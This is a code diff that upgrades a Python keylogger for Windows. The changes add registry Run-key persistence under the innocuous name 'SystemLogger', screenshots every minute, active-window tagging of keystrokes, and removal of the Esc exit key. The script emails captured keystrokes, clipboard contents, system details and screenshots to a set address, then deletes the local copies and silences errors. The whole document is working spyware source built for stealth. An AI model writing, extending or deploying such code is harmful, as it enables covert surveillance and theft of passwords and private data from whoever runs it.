@@ -4,6 +4,9 @@ import socket
 import platform
 import smtplib
 import win32clipboard
+import threading
+import pygetwindow as gw
+import winreg as reg
 from pynput.keyboard import Key, Listener
 from PIL import ImageGrab
 from requests import get
@@ -11,7 +14,6 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-import threading
 
 # File paths
 keys_information = "key_log.txt"
@@ -52,6 +54,20 @@ def copy_clipboard():
 def screenshot():
     ImageGrab.grab().save(file_merge + screenshot_information)
 
+# Periodic screenshot function
+def periodic_screenshot(interval=60):
+    while True:
+        screenshot()
+        time.sleep(interval)
+
+# Function to get active window title
+def get_active_window():
+    try:
+        window = gw.getActiveWindow()
+        return window.title if window else "Unknown Window"
+    except:
+        return "Unknown Window"
+    
 # Function to send an email with an attachment
 def send_email(filename, attachment_path, toaddr):
     msg = MIMEMultipart()
@@ -75,12 +91,20 @@ def send_email(filename, attachment_path, toaddr):
 
 # Keylogger functions
 keys = []
+last_window = None  # Variable to track the last active window
+
 def write_file(keys):
+    global last_window
     with open(file_merge + keys_information, "a") as f:
+        active_window = get_active_window()
+        if active_window != last_window:
+            f.write(f"\n[{active_window}]\n")  # Only add when window changes
+            last_window = active_window
+        
         for key in keys:
             k = str(key).replace("'", "")
             if "space" in k:
-                f.write('\n')
+                f.write(' ')
             elif "Key" not in k:
                 f.write(k)
 
@@ -91,31 +115,33 @@ def on_press(key):
         write_file(keys)
         keys = []
 
-def on_release(key):
-    if key == Key.esc:
-        return False
-
 def start_keylogger():
-    with Listener(on_press=on_press, on_release=on_release) as listener:
+    with Listener(on_press=on_press) as listener:
         listener.join()
+
+# Function to add the program to Windows startup
+def add_to_startup():
+    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE) as key:
+        reg.SetValueEx(key, "SystemLogger", 0, reg.REG_SZ, os.path.abspath(__file__))
+
+def send_and_delete_files():
+    for file in [keys_information, system_information, clipboard_information, screenshot_information]:
+        try:
+            send_email(file, file_merge + file, toaddr)
+            os.remove(file_merge + file)
+        except:
+            pass  # Prevents the program from stopping if there is an error
 
 # Main execution loop
 if __name__ == "__main__":
-   # Start the keylogger in a separate thread
-    listener_thread = threading.Thread(target=start_keylogger)
-    listener_thread.start()
+    add_to_startup()
+    
+    threading.Thread(target=start_keylogger, daemon=True).start()
+    threading.Thread(target=periodic_screenshot, daemon=True).start()
 
-    # Run the rest of the functions in the main thread
     while True:
-        # Step 1: Collect system info, clipboard content, and take screenshot
         computer_information()
         copy_clipboard()
-        screenshot()
-
-        # Step 2: Send collected files via email
-        for file in [keys_information, system_information, clipboard_information, screenshot_information]:
-            send_email(file, file_merge + file, toaddr)
-            os.remove(file_merge + file)
-
-        # Step 3: Wait before next iteration (adjust the time interval as necessary)
-        time.sleep(120)  # Adjust the time interval for the next cycle (in minutes)
+        send_and_delete_files()
+        time.sleep(120)
